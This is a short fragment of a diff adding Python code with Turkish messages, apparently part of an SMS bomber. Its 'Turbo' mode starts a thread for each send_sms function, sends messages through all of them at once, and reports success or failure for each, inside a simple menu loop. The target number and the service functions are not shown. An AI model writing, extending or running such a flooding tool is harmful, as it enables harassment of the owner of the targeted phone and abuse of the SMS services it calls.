+                        Fore.LIGHTGREEN_EX + f"✅ {fonk} ile SMS gönderildi!" if getattr(send_sms, fonk)()
+                        else Fore.LIGHTRED_EX + f"❌ {fonk} ile SMS başarısız!"
+                    ), daemon=True)
+                    thread_list.append(t)
+                    t.start()
+
+                for t in thread_list:
+                    t.join()
+
+        try:
+            Turbo()
+        except KeyboardInterrupt:
+            dur.set()
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "\n🔴 Turbo Mod durduruldu! Menüye dönülüyor...")
+            sleep(2)
+
+    elif secim == "3":
+        print(Fore.LIGHTRED_EX + "🚪 Çıkış yapılıyor...")
+        break
+
+    else:
+        print(Fore.LIGHTRED_EX + "❌ Geçersiz seçim! Tekrar deneyin.")
+        sleep(2)
